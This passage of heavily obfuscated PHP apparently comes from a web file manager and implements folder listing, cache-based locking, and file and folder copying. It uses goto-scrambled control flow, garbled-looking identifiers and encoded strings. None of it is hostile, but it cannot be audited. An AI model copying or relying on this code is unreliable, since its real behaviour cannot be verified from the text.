$GLOBALS[$b≤ı”¢≤à⁄[6]][$b≤ı”¢≤à⁄[88]][$b≤ı”¢≤à⁄[522]]; if ($cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[446]][$b≤ı”¢≤à⁄[523]] <= time() - $dÑ†„ﬁ‹´¶) { $this->metaSet($cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[396]], $b≤ı”¢≤à⁄[521], null); $this->metaSet($cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[396]], $b≤ı”¢≤à⁄[523], null); unset($cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[446]][$b≤ı”¢≤à⁄[521]]); continue; } $céá±Áãé« = $cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[446]][$b≤ı”¢≤à⁄[521]]; $cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[446]][$b≤ı”¢≤à⁄[524]] = Model($b≤ı”¢≤à⁄[520])->getInfoSimpleOuter($céá±Áãé«); } } goto aíÚ˘˜°Áò; D±ÃÍã»µˆ: $b≤ı”¢≤à⁄ =& $_SERVER[Öíæ€“”≠éÏË]; $Bòô≥æ◊‹ã = array_to_keyvalue($f◊“¬éä¿ì, $b≤ı”¢≤à⁄[33], $b≤ı”¢≤à⁄[433]); $C∑ÜÊ‰ÔŒ¿ = array_to_keyvalue($f◊“¬éä¿ì, $b≤ı”¢≤à⁄[33], $b≤ı”¢≤à⁄[435]); goto A©Ò§ÇúáΩ; aíÚ˘˜°Áò: unset($cÈß–ØÇﬁ⁄); goto F∞ö¿Ãéœí; F∞ö¿Ãéœí: } public function parentLevelArray($e‰µû≥ﬁóÙ) { $E‡‚¶Î‰¶ú =& $_SERVER[Öíæ€“”≠éÏË]; $e‰µû≥ﬁóÙ = explode($E‡‚¶Î‰¶ú[47], trim($e‰µû≥ﬁóÙ, $E‡‚¶Î‰¶ú[47])); return array_remove_value($e‰µû≥ﬁóÙ, $E‡‚¶Î‰¶ú[191]); } public function listAll($dåﬂÉá‘œ€) { goto fÑîÁíﬁ’´; fúé§∆†æº: $aÀ‰Î£∫‹ä = $E¢πß≥ ÂŸ[529]; $AßëÑïÇ¢ß = "\x4c\105\106\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\146\151\154\145\40\x66\151\154\x65\40\x6f\x6e\x20\163\x6f\165\x72\x63\x65\x2e\x66\151\x6c\145\111\104\40\75\40\x66\151\x6c\145\56\x66\151\154\145\x49\104"; $cç‹ùòòó‰ = $this->alias($E¢πß≥ ÂŸ[530])->field($aÀ‰Î£∫‹ä)->where($DÖ ˘·ìœÇ)->join($AßëÑïÇ¢ß)->select(); goto AêŒèœ»åÙ; fﬁÆÒëï ˜: $cç‹ùòòó‰ = array_to_keyvalue($cç‹ùòòó‰, $E¢πß≥ ÂŸ[396]); $bê€›ÊŒ”€ = "\57{$fÇ¯ÆÔﬁ’ß[$E¢πß≥ ÂŸ[28]]}\57"; $bê€›ÊŒ”€ = $bê€›ÊŒ”€ == $E¢πß≥ ÂŸ[511] ? $E¢πß≥ ÂŸ[8] : $bê€›ÊŒ”€; goto fü◊ΩÔıƒÆ; fü◊ΩÔıƒÆ: $DàÚ§Ê£ëÖ = array(); foreach ($cç‹ùòòó‰ as $A–¿…ç‡„ò => $dûñ¶™⁄ª¿) { goto c…ûäü»Ø≈; Dåôæ˘ÿáÛ: for ($c€Ç⁄€≤Ã˘ = 0; $c€Ç⁄€≤Ã˘ < count($C∆•πã√ıã); $c€Ç⁄€≤Ã˘++) { $fÈ«©É≤øÿ .= $cç‹ùòòó‰[$C∆•πã√ıã[$c€Ç⁄€≤Ã˘]][$E¢πß≥ ÂŸ[28]] . $E¢πß≥ ÂŸ[8]; } $fÈ«©É≤øÿ .= $dûñ¶™⁄ª¿[$E¢πß≥ ÂŸ[28]]; if ($dûñ¶™⁄ª¿[$E¢πß≥ ÂŸ[404]]) { $fÈ«©É≤øÿ .= $E¢πß≥ ÂŸ[8]; } goto b¢ß∫ÊÀ√π; c…ûäü»Ø≈: $C∆•πã√ıã = $this->parentLevelArray($dûñ¶™⁄ª¿[$E¢πß≥ ÂŸ[503]]); array_shift($C∆•πã√ıã); $fÈ«©É≤øÿ = $bê€›ÊŒ”€; goto Dåôæ˘ÿáÛ; eÕ≥‘˘ëŸª: if (!$dûñ¶™⁄ª¿[$E¢πß≥ ÂŸ[404]]) { $AÃ•ëüıãª[$E¢πß≥ ÂŸ[448]] = $dûñ¶™⁄ª¿[$E¢πß≥ ÂŸ[448]]; $AÃ•ëüıãª[$E¢πß≥ ÂŸ[86]] = $dûñ¶™⁄ª¿[$E¢πß≥ ÂŸ[76]]; } $DàÚ§Ê£ëÖ[] = $AÃ•ëüıãª; goto døçÌÛï«ÿ; b¢ß∫ÊÀ√π: $fÈ«©É≤øÿ = str_replace($E¢πß≥ ÂŸ[511], $E¢πß≥ ÂŸ[8], $fÈ«©É≤øÿ); $fÈ«©É≤øÿ = str_replace($E¢πß≥ ÂŸ[511], $E¢πß≥ ÂŸ[8], $fÈ«©É≤øÿ); $AÃ•ëüıãª = array($E¢πß≥ ÂŸ[415] => str_replace($E¢πß≥ ÂŸ[511], $E¢πß≥ ÂŸ[8], $fÈ«©É≤øÿ), $E¢πß≥ ÂŸ[531] => intval($dûñ¶™⁄ª¿[$E¢πß≥ ÂŸ[404]]), $E¢πß≥ ÂŸ[85] => $this->pathInfoFilter($dûñ¶™⁄ª¿)); goto eÕ≥‘˘ëŸª; døçÌÛï«ÿ: } return $DàÚ§Ê£ëÖ; goto aÊ˘ıåäâÀ; fÑîÁíﬁ’´: $E¢πß≥ ÂŸ =& $_SERVER[Öíæ€“”≠éÏË]; $fÇ¯ÆÔﬁ’ß = $this->sourceInfo($dåﬂÉá‘œ€); $DÖ ˘·ìœÇ = array($E¢πß≥ ÂŸ[525] => array($E¢πß≥ ÂŸ[526], $fÇ¯ÆÔﬁ’ß[$E¢πß≥ ÂŸ[503]] . $dåﬂÉá‘œ€ . $E¢πß≥ ÂŸ[527]), $E¢πß≥ ÂŸ[528] => 0); goto fúé§∆†æº; AêŒèœ»åÙ: $this->_listAppendAuth($cç‹ùòòó‰); $this->_listAppendUser($cç‹ùòòó‰); $this->_listAppendPath($cç‹ùòòó‰); goto fﬁÆÒëï ˜; aÊ˘ıåäâÀ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($eêπàÛÁ¢ø) { goto eÆÍ∂î”Ñ; dÊÈÉôäºÃ: $this->_lockEvent($eêπàÛÁ¢ø, array($AÖéà£ØõÕ[535], $AÖéà£ØõÕ[536]), $B›ŒîçÏ»Œ); $this->_lockCheckEnd($AÖéà£ØõÕ[532], $eêπàÛÁ¢ø); goto a…èÏ öÉë; eÆÍ∂î”Ñ: $AÖéà£ØõÕ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÖéà£ØõÕ[532], $eêπàÛÁ¢ø); goto aÓ®≤É¶Ü§; aÓ®≤É¶Ü§: $B›ŒîçÏ»Œ = 1; $this->_lockEvent($eêπàÛÁ¢ø, array($AÖéà£ØõÕ[533], $AÖéà£ØõÕ[534]), $B›ŒîçÏ»Œ); $this->_lockParent($eêπàÛÁ¢ø, array($AÖéà£ØõÕ[534]), $B›ŒîçÏ»Œ); goto dÊÈÉôäºÃ; a…èÏ öÉë: } public function lockCopyEnd($B∫“¿ÔÁ°º) { $aÉﬁüáû°€ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->allowLock()) { return; } $føü´ûéà¥ = 0; $this->_lockEvent($B∫“¿ÔÁ°º, array($aÉﬁüáû°€[533], $aÉﬁüáû°€[534]), $føü´ûéà¥); $this->_lockParent($B∫“¿ÔÁ°º, array($aÉﬁüáû°€[534]), $føü´ûéà¥); $this->_lockEvent($B∫“¿ÔÁ°º, array($aÉﬁüáû°€[535], $aÉﬁüáû°€[536]), $føü´ûéà¥); } public function lockWriteStart($Cí∆ü®á¯–, $CÊ’ÏÓ¶ß¡ = '') { goto eÚ„Ü∑√®Ω; F™¯•äƒò¢: $this->_lockParent($Cí∆ü®á¯–, array($CˆôôŒÒÒ¿[532], $CˆôôŒÒÒ¿[534]), $F‘”ƒΩ»Ì–); $this->_lockCheckEnd($CˆôôŒÒÒ¿[533], $Cí∆ü®á¯–); goto BïÖ«ô¶≠›; AùûÍõÕÁí: $F‘”ƒΩ»Ì– = 1; $this->_lockKey($CˆôôŒÒÒ¿[537] . $Cí∆ü®á¯– . $CˆôôŒÒÒ¿[95] . $CÊ’ÏÓ¶ß¡, $F‘”ƒΩ»Ì–); $this->_lockEvent($Cí∆ü®á¯–, array($CˆôôŒÒÒ¿[532], $CˆôôŒÒÒ¿[534]), $F‘”ƒΩ»Ì–); goto F™¯•äƒò¢; eÚ„Ü∑√®Ω: $CˆôôŒÒÒ¿ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->allowLock()) { return; } $this->_lockCheck($CˆôôŒÒÒ¿[533], $Cí∆ü®á¯–); goto AùûÍõÕÁí; BïÖ«ô¶≠›: } public function lockWriteEnd($D¨∏êéòç, $bøÍÎÎÜ«· = '') { $eıÖ˜®π¨¿ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->allowLock()) { return; } $cÁ«ﬁœ´ôõ = 0; $this->_lockKey($eıÖ˜®π¨¿[537] . $D¨∏êéòç . $eıÖ˜®π¨¿[95] . $bøÍÎÎÜ«·, $cÁ«ﬁœ´ôõ); $this->_lockEvent($D¨∏êéòç, array($eıÖ˜®π¨¿[532], $eıÖ˜®π¨¿[534]), $cÁ«ﬁœ´ôõ); $this->_lockParent($D¨∏êéòç, array($eıÖ˜®π¨¿[532], $eıÖ˜®π¨¿[534]), $cÁ«ﬁœ´ôõ); } public function lockMoveStart($c˘òµ®…èê) { goto D¡ËÜë Ùø; D¡ËÜë Ùø: $dâ√áÑÒ§ƒ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->allowLock()) { return; } $this->_lockCheck($dâ√áÑÒ§ƒ[534], $c˘òµ®…èê); goto a¬≠ÿ–øÍ¶; f∑”£˘∞†õ: $this->_lockParent($c˘òµ®…èê, array($dâ√áÑÒ§ƒ[532], $dâ√áÑÒ§ƒ[534]), $FéÇö∞‘¡¯); $this->_lockEvent($c˘òµ®…èê, array($dâ√áÑÒ§ƒ[539], $dâ√áÑÒ§ƒ[535], $dâ√áÑÒ§ƒ[536]), $FéÇö∞‘¡¯); $this->_lockCheckEnd($dâ√áÑÒ§ƒ[534], $c˘òµ®…èê); goto a°ê◊ñ∫öÈ; a¬≠ÿ–øÍ¶: $FéÇö∞‘¡¯ = 1; $this->_lockKey($dâ√áÑÒ§ƒ[538] . $c˘òµ®…èê, $FéÇö∞‘¡¯); $this->_lockEvent($c˘òµ®…èê, array($dâ√áÑÒ§ƒ[532], $dâ√áÑÒ§ƒ[533]), $FéÇö∞‘¡¯); goto f∑”£˘∞†õ; a°ê◊ñ∫öÈ: } public function lockMoveEnd($eÀÇÁΩêèπ) { goto dàÙªåõä™; bÜü§∑íÉœ: $this->_lockKey($dƒƒ∏ÆöúÑ[538] . $eÀÇÁΩêèπ, $dÿëÜΩØà∑); $this->_lockEvent($eÀÇÁΩêèπ, array($dƒƒ∏ÆöúÑ[532], $dƒƒ∏ÆöúÑ[533]), $dÿëÜΩØà∑); $this->_lockParent($eÀÇÁΩêèπ, array($dƒƒ∏ÆöúÑ[532], $dƒƒ∏ÆöúÑ[534]), $dÿëÜΩØà∑); goto A„«áã†ïë; A„«áã†ïë: $this->_lockEvent($eÀÇÁΩêèπ, array($dƒƒ∏ÆöúÑ[539], $dƒƒ∏ÆöúÑ[535], $dƒƒ∏ÆöúÑ[536]), $dÿëÜΩØà∑); goto aé£ú”®êŒ; dàÙªåõä™: $dƒƒ∏ÆöúÑ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->allowLock()) { return; } $dÿëÜΩØà∑ = 0; goto bÜü§∑íÉœ; aé£ú”®êŒ: } private function _lockCheck($EÖÜÛäÁìç, $AÁÙæ“Ë) { goto EÙªü⁄Ÿ÷Ó; EÙªü⁄Ÿ÷Ó: $cƒâ⁄œΩ≤ã =& $_SERVER[Öíæ€“”≠éÏË]; $bñÔé·°Ç˜ = $this->sourceInfo($AÁÙæ“Ë); $eò´≈—Öì‰ = $EÖÜÛäÁìç . $cƒâ⁄œΩ≤ã[95] . $AÁÙæ“Ë; goto Bç§‡Æº„Ú; d˘¢‹µﬁÖ–: CacheLock::setErrorMsg($cƒâ⁄œΩ≤ã[160] . htmlspecialchars($bñÔé·°Ç˜[$cƒâ⁄œΩ≤ã[28]]) . $cƒâ⁄œΩ≤ã[518] . $b¡ﬁêÀ˘ôÜ); $this->_lockKey($eò´≈—Öì‰, 1); $this->_lockKey($eò´≈—Öì‰, 0); goto cçØÑ·œ¶ë; Bç§‡Æº„Ú: $this->_lockTimeStart[$eò´≈—Öì‰] = timeFloat(); if (!is_array($bñÔé·°Ç˜)) { return; } $b¡ﬁêÀ˘ôÜ = LNG($cƒâ⁄œΩ≤ã[540]); goto d˘¢‹µﬁÖ–; cçØÑ·œ¶ë: $Eìäë∆‘ü‰ = array_reverse($this->parentLevelArray($bñÔé·°Ç˜[$cƒâ⁄œΩ≤ã[503]])); foreach ($Eìäë∆‘ü‰ as $FÏÌ»⁄®ÕË) { $eò´≈—Öì‰ = $EÖÜÛäÁìç . $cƒâ⁄œΩ≤ã[541] . $FÏÌ»⁄®ÕË; if (CacheLock::lockGet($cƒâ⁄œΩ≤ã[542] . $eò´≈—Öì‰)) { $bñÔé·°Ç˜ = $this->sourceInfo($FÏÌ»⁄®ÕË); CacheLock::setErrorMsg($cƒâ⁄œΩ≤ã[160] . htmlspecialchars($bñÔé·°Ç˜[$cƒâ⁄œΩ≤ã[28]]) . $cƒâ⁄œΩ≤ã[518] . $b¡ﬁêÀ˘ôÜ); $this->_lockKey($eò´≈—Öì‰, 1); $this->_lockKey($eò´≈—Öì‰, 0); } } goto c™—ï€¡≥°; c™—ï€¡≥°: } private function _lockCheckEnd($e Ô •ûÉ◊, $F≤ï∑¶éåï) { goto eßﬁ‰∫Ê¿ì; eßﬁ‰∫Ê¿ì: $C„ÉàÇöò =& $_SERVER[Öíæ€“”≠éÏË]; $A ¯å€≤Ã∂ = $e Ô •ûÉ◊ . $C„ÉàÇöò[95] . $F≤ï∑¶éåï; CacheLock::setErrorMsg($C„ÉàÇöò[375]); goto b’•ƒ·êÚÏ; aîÆΩÔÑé˜: if ($Bé∫˘ÒÍΩÉ > 0.5) { unset(self::$cacheSourceInfo[$C„ÉàÇöò[439] . $F≤ï∑¶éåï]); } $Dú–åÙà©© = $this->sourceInfo($F≤ï∑¶éåï); if (!$Dú–åÙà©©) { show_json(LNG($C„ÉàÇöò[105]), !1); } goto d¶ô©Ü›¶©; b’•ƒ·êÚÏ: if (!isset($this->_lockTimeStart[$A ¯å€≤Ã∂])) { return; } $Bé∫˘ÒÍΩÉ = timeFloat() - $this->_lockTimeStart[$A ¯å€≤Ã∂]; unset($this->_lockTimeStart[$A ¯å€≤Ã∂]); goto aîÆΩÔÑé˜; d¶ô©Ü›¶©: } private function _lockParent($eáÑÏ◊≥‡«, $A∂Ñö®¬î», $a«¢¶∞’∂÷) { if (!$this->autoLockSet) { return; } $d£éıÁáöã = $this->sourceInfo($eáÑÏ◊≥‡«); if (!is_array($d£éıÁáöã)) { return; } $e⁄ˆˆœÑŒï = array_reverse($this->parentLevelArray($d£éıÁáöã[$_SERVER[Öíæ€“”≠éÏË][503]])); foreach ($e⁄ˆˆœÑŒï as $dêı†ÀÜÁ‘) { $this->_lockEvent($dêı†ÀÜÁ‘, $A∂Ñö®¬î», $a«¢¶∞’∂÷); } } private function _lockEvent($Cæ≥©à¨öË, $AÂÃÉÕïØº, $DÁ·ƒÑ¶–©) { $aôŸç”“•· =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->autoLockSet) { return; } foreach ($AÂÃÉÕïØº as $e‡àÀîçò…) { $c≤ÿÃ¶ı“” = $e‡àÀîçò… . $aôŸç”“•·[95] . $Cæ≥©à¨öË; if ($DÁ·ƒÑ¶–© && CacheLock::lockGet($aôŸç”“•·[542] . $c≤ÿÃ¶ı“”)) { continue; } $this->_lockKey($c≤ÿÃ¶ı“”, $DÁ·ƒÑ¶–©); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($bùá˘÷ãΩÀ, $Bì‡º∑åçƒ = 1) { $f÷’ï•µ∑‰ = $_SERVER[Öíæ€“”≠éÏË][542] . md5($bùá˘÷ãΩÀ); if ($Bì‡º∑åçƒ) { if (isset(self::$_lockItemArr[$f÷’ï•µ∑‰])) { return; } self::$_lockItemArr[$f÷’ï•µ∑‰] = 1; CacheLock::lock($f÷’ï•µ∑‰, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$f÷’ï•µ∑‰])) { return; } unset(self::$_lockItemArr[$f÷’ï•µ∑‰]); CacheLock::unlock($f÷’ï•µ∑‰); } } public function isParentOf($A¨Ã∏Ûòï¡, $fÔ˜˜°›‚œ) { goto F‹Ïı˜Îß‰; F‹Ïı˜Îß‰: $D ∞∫Ñ˘÷¬ =& $_SERVER[Öíæ€“”≠éÏË]; $CÓã–€ù€è = $this->sourceInfo($A¨Ã∏Ûòï¡); $dÜˆ»©‹±Ÿ = $this->sourceInfo($fÔ˜˜°›‚œ); goto fÒÛè⁄∫πé; fÒÛè⁄∫πé: $A∞ÉûÚé…ó = $CÓã–€ù€è[$D ∞∫Ñ˘÷¬[503]] . $CÓã–€ù€è[$D ∞∫Ñ˘÷¬[396]] . $D ∞∫Ñ˘÷¬[47]; $eÒ˜¯Éä≤ = $dÜˆ»©‹±Ÿ[$D ∞∫Ñ˘÷¬[503]] . $dÜˆ»©‹±Ÿ[$D ∞∫Ñ˘÷¬[396]] . $D ∞∫Ñ˘÷¬[47]; $eâÀ ‘Ï¯´ = strpos($eÒ˜¯Éä≤, $A∞ÉûÚé…ó) === 0; goto fÖŒ´ÌÌÑÑ; fÖŒ´ÌÌÑÑ: return $eâÀ ‘Ï¯´; goto fâî„µﬁΩ„; fâî„µﬁΩ„: } private $targetIsDelete = 0; public function copy($fÊ¢ËùàÒ·, $CÛø∂¡√äÉ, $d¬¡≠ëìï = REPEAT_REPLACE, $cÀúè∆Ñ– = '') { goto C‡√ì≤Úë°; e™èß¥’∆≈: $this->updateModifyTime($CÛø∂¡√äÉ); return $Bç“õ…≤Œ¡; goto D≈ÑàÊÑ„˜; E‹“ÏÌÛ‚¡: $this->targetIsDelete = intval($dÇ◊ÌÎ±≈∆[$cãç¢±∞’í[424]]); $EµÎ·ã‰ƒô = $this->fileNameExistCache($CÛø∂¡√äÉ, $dÇ◊ÌÎ±≈∆[$cãç¢±∞’í[28]]); $Bç“õ…≤Œ¡ = $this->_copy($fÊ¢ËùàÒ·, $CÛø∂¡√äÉ, $d¬¡≠ëìï, $cù€¶‹ΩƒÒ, !0, $cÀúè∆Ñ–); goto Dª”’∫ôΩ ; FèÇÖ¶æøÛ: $this->lockCopyStart($fÊ¢ËùàÒ·); $this->lockWriteStart($CÛø∂¡√äÉ, $c§åπ¿œﬂ¨); $cù€¶‹ΩƒÒ = array($cãç¢±∞’í[543] => array(), $cãç¢±∞’í[544] => array(), $cãç¢±∞’í[545] => array()); goto E‹“ÏÌÛ‚¡; fô∏§ó’ÙÉ: $this->saveAll($cù€¶‹ΩƒÒ[$cãç¢±∞’í[545]]); Model($cãç¢±∞’í[193])->linkAdd($cù€¶‹ΩƒÒ[$cãç¢±∞’í[543]]); $this->folderSizeReset($CÛø∂¡√äÉ); goto e™èß¥’∆≈; Dª”’∫ôΩ : $this->_childrenListClear(); $this->lockCopyEnd($fÊ¢ËùàÒ·); $this->lockWriteEnd($CÛø∂¡√äÉ, $c§åπ¿œﬂ¨); goto DÉ◊°ç íÆ; a©çÜêπ∏à: if (!$dÇ◊ÌÎ±≈∆ || !$dÁâÒíÜÈΩ || $dÁâÒíÜÈΩ[$cãç¢±∞’í[404]] != $cãç¢±∞’í[87]) { return !1; } if ($this->isParentOf($fÊ¢ËùàÒ·, $CÛø∂¡√äÉ)) { return !1; } $c§åπ¿œﬂ¨ = $cÀúè∆Ñ– ? $cÀúè∆Ñ– : $dÇ◊ÌÎ±≈∆[$cãç¢±∞’í[28]]; goto FèÇÖ¶æøÛ; C‡√ì≤Úë°: $cãç¢±∞’í =& $_SERVER[Öíæ€“”≠éÏË]; $dÇ◊ÌÎ±≈∆ = $this->sourceInfo($fÊ¢ËùàÒ·); $dÁâÒíÜÈΩ = $this->sourceInfo($CÛø∂¡√äÉ); goto a©çÜêπ∏à; DÉ◊°ç íÆ: if ($dÇ◊ÌÎ±≈∆[$cãç¢±∞’í[404]] == $cãç¢±∞’í[87] && $EµÎ·ã‰ƒô == $Bç“õ…≤Œ¡) { $this->folderSizeResetChildren($EµÎ·ã‰ƒô); } Model($cãç¢±∞’í[546])->addAll($cù€¶‹ΩƒÒ[$cãç¢±∞’í[544]], array(), !0); if ($EµÎ·ã‰ƒô != $Bç“õ…≤Œ¡ || $dÇ◊ÌÎ±≈∆[$cãç¢±∞’í[404]] == $cãç¢±∞’í[87]) { Model($cãç¢±∞’í[547])->eventCopy($Bç“õ…≤Œ¡); } goto fô∏§ó’ÙÉ; D≈ÑàÊÑ„˜: } private function _copy($Fò™Ï‘…è‚, $Aâ≈µ–êçì, $dØÙ”öÀÑ√, &$f–ùÙ–ñóæ, $d∏ø›Ó–¡ç, $eÈ˜Œùê € = '') { goto e—·äı§ôê; BÖ⁄Î–ÜÂú: if (!$fèÈ≥òèÿΩ) { return $this->_copyCreate($Fò™Ï‘…è‚, $Aâ≈µ–êçì, $DËŸà€€á, $f–ùÙ–ñóæ); } $cΩæœâÂﬂ∏ = $fèÈ≥òèÿΩ; if ($d¬ëÿﬂ∂öπ) { if ($dØÙ”öÀÑ√ == REPEAT_RENAME_FOLDER) { $DËŸà€€á = $this->fileNameAutoCache($Aâ≈µ–êçì, $DËŸà€€á, $dØÙ”öÀÑ√, $d¬ëÿﬂ∂öπ); $cΩæœâÂﬂ∏ = $this->_copyCreate($Fò™Ï‘…è‚, $Aâ≈µ–êçì, $DËŸà€€á, $f–ùÙ–ñóæ); } else { $A›Û◊Úç∂‚ = $this->_childrenList($Fò™Ï‘…è‚); foreach ($A›Û◊Úç∂‚ as $EÔ©œåÏë†) { $this->_copy($EÔ©œåÏë†[$E˜ﬂ«Ÿàë∑[396]], $fèÈ≥òèÿΩ, $dØÙ”öÀÑ√, $f–ùÙ–ñóæ, !1); } } } else { if ($dØÙ”öÀÑ√ == REPEAT_RENAME || $dØÙ”öÀÑ√ == REPEAT_RENAME_FOLDER) { $DËŸà€€á = $this->fileNameAutoCache($Aâ≈µ–êçì, $DËŸà€€á, $dØÙ”öÀÑ√, $d¬ëÿﬂ∂öπ); $cΩæœâÂﬂ∏ = $this->_copyCreate($Fò™Ï‘…è‚, $Aâ≈µ–êçì, $DËŸà€€á, $f–ùÙ–ñóæ); } else { if ($dØÙ”öÀÑ√ == REPEAT_REPLACE) { $f÷óÍ°œÇ— = $this->sourceInfoCache($fèÈ≥òèÿΩ); $bÑƒ∞ìÇÇ¯ = $this->fileHistory($f÷óÍ°œÇ—, $Bèã‰∆éçß[$E˜ﬂ«Ÿàë∑[448]], $Bèã‰∆éçß[$E˜ﬂ«Ÿàë∑[78]]); if ($bÑƒ∞ìÇÇ¯) { $f–ùÙ–ñóæ[$E˜ﬂ«Ÿàë∑[543]][] = $Bèã‰∆éçß[$E˜ﬂ«Ÿàë∑[448]]; } } else { if ($dØÙ”öÀÑ√ == REPEAT_SKIP) { } } } Hook::trigger($E˜ﬂ«Ÿàë∑[548], array($E˜ﬂ«Ÿàë∑[549], $Bèã‰∆éçß, 0)); } goto DÒíµ≤Ø’¶; e—·äı§ôê: $E˜ﬂ«Ÿàë∑ =& $_SERVER[Öíæ€“”≠éÏË]; $Bèã‰∆éçß = $this->sourceInfoCache($Fò™Ï‘…è‚); $d¬ëÿﬂ∂öπ = $Bèã‰∆éçß[$E˜ﬂ«Ÿàë∑[404]] == $E˜ﬂ«Ÿàë∑[87]; goto EÇ±ÇŒ™™; DÒíµ≤Ø’¶: return $cΩæœâÂﬂ∏; goto D˜à‡áŸß„; EÇ±ÇŒ™™: $DËŸà€€á = $eÈ˜Œùê € ? $eÈ˜Œùê € : $Bèã‰∆éçß[$E˜ﬂ«Ÿàë∑[28]]; $fèÈ≥òèÿΩ = $this->fileNameExistCache($Aâ≈µ–êçì, $DËŸà€€á); if ($d∏ø›Ó–¡ç) { $this->_childrenAllMake($Fò™Ï‘…è‚); if ($d¬ëÿﬂ∂öπ && $fèÈ≥òèÿΩ) { $this->_childrenAllMake($fèÈ≥òèÿΩ); } } goto BÖ⁄Î–ÜÂú; D˜à‡áŸß„: } private function _copyCreate($c–ΩË≈¨äÏ, $F£§Úèà√î, $e±ÕÈÚÚÈπ, &$fﬂ¢ûÚﬂŒπ) { goto FÔ Ü¯àÑÁ; DÂè£§ì∑: $fıá¡Ôâ† = $this->sourceInfo($a∏Ωô∆ÿò“); foreach ($E£Ñö«”Ìù as $DÎ€ùπ€¿) { $BÍÁê‚≠ãŒ = $this->_makeItemData($DÎ€ùπ€¿, $fıá¡Ôâ†, $DÎ€ùπ€¿[$b˘ßö≠öı†[28]]); $BÍÁê‚≠ãŒ[$b˘ßö≠öı†[503]] = $DÎ€ùπ€¿[$b˘ßö≠öı†[503]]; $e≤‚ÿÓôÜÜ[] = $BÍÁê‚≠ãŒ; } $this->chunkEventSet($b˘ßö≠öı†[553], array($b˘ßö≠öı†[554], $C∂∑»∆ŸÜÉ, $DÑ”‡á≤∑ù)); goto DíËÈÔùÂØ; Aê‰ÛÛë∫á: foreach ($fëÇˆÇΩå as $DÎ€ùπ€¿) { $c¢ûìÂ‚Õ“ = $DÎ€ùπ€¿[$b˘ßö≠öı†[396]]; $c¢Ñ«‹£˜À = $this->_childrenMatch($Dÿµ¡âÓ‘§, $DÎ€ùπ€¿, $fıá¡Ôâ†); $DÕ¿‡•ÇÚ–[] = array($b˘ßö≠öı†[396], $c¢ûìÂ‚Õ“, $b˘ßö≠öı†[479], $c¢Ñ«‹£˜À[$b˘ßö≠öı†[479]]); $c“ÖÜãÇ∫¨[] = array($b˘ßö≠öı†[396], $c¢ûìÂ‚Õ“, $b˘ßö≠öı†[503], $c¢Ñ«‹£˜À[$b˘ßö≠öı†[503]]); $this->_copyApplyMeta($DÎ€ùπ€¿, $fﬂ¢ûÚﬂŒπ); if ($DÎ€ùπ€¿[$b˘ßö≠öı†[404]] != $b˘ßö≠öı†[87]) { $fﬂ¢ûÚﬂŒπ[$b˘ßö≠öı†[543]][] = $DÎ€ùπ€¿[$b˘ßö≠öı†[448]]; } } $this->chunkEventSet($b˘ßö≠öı†[555], array($b˘ßö≠öı†[556], $C∂∑»∆ŸÜÉ, $DÑ”‡á≤∑ù)); $this->saveAll($DÕ¿‡•ÇÚ–); goto aÆ∫ÇêÜõé; FÔ Ü¯àÑÁ: $b˘ßö≠öı† =& $_SERVER[Öíæ€“”≠éÏË]; $fÉÌ¥·€Ÿö = $this->sourceInfoCache($c–ΩË≈¨äÏ); $F∆±Ω´•Ñâ = $this->sourceInfoCache($F£§Úèà√î); goto aÁ–âÛƒáŸ; f≠îÌ·¯çæ: $this->_childrenListAll($c–ΩË≈¨äÏ, $E£Ñö«”Ìù); $DÑ”‡á≤∑ù = count($E£Ñö«”Ìù); if ($DÑ”‡á≤∑ù == 0) { return $a∏Ωô∆ÿò“; } goto DÂè£§ì∑; fÖ»¬·á¥‚: $a∏Ωô∆ÿò“ = $this->add($C∂∑»∆ŸÜÉ); $dñ«¬ÌŒÂ— = array($b˘ßö≠öı†[396] => $a∏Ωô∆ÿò“, $b˘ßö≠öı†[28] => $e±ÕÈÚÚÈπ); $this->_copyApplyMeta($dñ«¬ÌŒÂ—, $fﬂ¢ûÚﬂŒπ); goto AáÔ—πˆèŸ; AáÔ—πˆèŸ: if ($fÉÌ¥·€Ÿö[$b˘ßö≠öı†[404]] != $b˘ßö≠öı†[87]) { $fﬂ¢ûÚﬂŒπ[$b˘ßö≠öı†[543]][] = $fÉÌ¥·€Ÿö[$b˘ßö≠öı†[448]]; return $a∏Ωô∆ÿò“; } $E£Ñö«”Ìù = array(); $e≤‚ÿÓôÜÜ = array(); goto f≠îÌ·¯çæ; c»äåëÉÕÎ: $Dÿµ¡âÓ‘§[$c–ΩË≈¨äÏ] = $a∏Ωô∆ÿò“; $DÕ¿‡•ÇÚ– = array(); $c“ÖÜãÇ∫¨ = array(); goto Aê‰ÛÛë∫á; aÆ∫ÇêÜõé: $this->chunkEventSet($b˘ßö≠öı†[557], array($b˘ßö≠öı†[558], $C∂∑»∆ŸÜÉ, $DÑ”‡á≤∑ù)); $this->saveAll($c“ÖÜãÇ∫¨); return $a∏Ωô∆ÿò“; goto EûÑøÑó∆¢; DíËÈÔùÂØ: $this->addAll($e≤‚ÿÓôÜÜ, array(), !1); $fëÇˆÇΩå = $this->where(array($b˘ßö≠öı†[479] => $a∏Ωô∆ÿò“))->select(); $Dÿµ¡âÓ‘§ = $this->_childrenMakeRelation($E£Ñö«”Ìù, $fëÇˆÇΩå); goto c»äåëÉÕÎ; aÁ–âÛƒáŸ: $C∂∑»∆ŸÜÉ = $this->_makeItemData($fÉÌ¥·€Ÿö, $F∆±Ω´•Ñâ, $e±ÕÈÚÚÈπ); 